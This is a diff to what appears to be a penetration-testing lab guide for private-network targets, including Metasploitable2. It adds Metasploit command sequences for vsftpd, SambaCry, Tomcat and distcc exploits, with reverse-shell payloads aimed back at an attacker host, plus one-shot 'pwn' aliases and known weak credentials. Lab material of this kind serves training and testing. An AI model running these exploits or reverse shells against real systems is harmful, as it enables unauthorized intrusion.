@@ -69,15 +69,20 @@ msf6> set RHOSTS 172.20.0.15
 msf6> run
 ```
 
+**One-shot:** `pwn vsftpd`
+
 ### 172.20.0.16 - SambaCry (CVE-2017-7494)
 
 ```
 msf6> use exploit/linux/samba/is_known_pipename
 msf6> set RHOSTS 172.20.0.16
-msf6> set SMBUser nobody
-msf6> set SMBPass ""
+msf6> set SMB_SHARE_NAME data
+msf6> set SMBUser sambacry
+msf6> set SMBPass nosambanocry
 msf6> run
 ```
+
+**One-shot:** `pwn sambacry`
 
 ### 172.20.0.17 - SSH Brute Force
 
@@ -96,6 +101,8 @@ hydra -l root -P wordlists/seclists/Passwords/Common-Credentials/10k-most-common
 ```
 
 Known creds: `root/root`, `user/password`
+
+**One-shot:** `pwn ssh`
 
 ### 172.20.0.18 - MySQL Weak Credentials
 
@@ -120,22 +127,32 @@ msf6> set RHOSTS 172.20.0.19
 msf6> set RPORT 8080
 msf6> set HttpUsername tomcat
 msf6> set HttpPassword tomcat
+msf6> set PAYLOAD java/shell_reverse_tcp
+msf6> set LHOST 172.20.0.5
 msf6> run
 ```
 
-### 172.20.0.20 - Metasploitable2 (Multiple Vulns)
+**One-shot:** `pwn tomcat`
 
-Target-rich environment. Start with recon:
-```bash
-nmap -sV -sC 172.20.0.20
+### 172.20.0.20 - Metasploitable2 DistCC
+
+```
+msf6> use exploit/unix/misc/distcc_exec
+msf6> set RHOSTS 172.20.0.20
+msf6> set LHOST 172.20.0.5
+msf6> set PAYLOAD cmd/unix/reverse_perl
+msf6> run
 ```
 
-Common vulns:
+**One-shot:** `pwn distcc`
+
+**Note:** Use `cmd/unix/reverse_perl`, not `reverse_bash` - target's bash lacks `/dev/tcp`.
+
+**Other vulns on Metasploitable2:**
 - FTP anonymous login
 - SSH weak passwords
 - Unreal IRCd backdoor
 - Samba
-- distcc
 
 ---
 
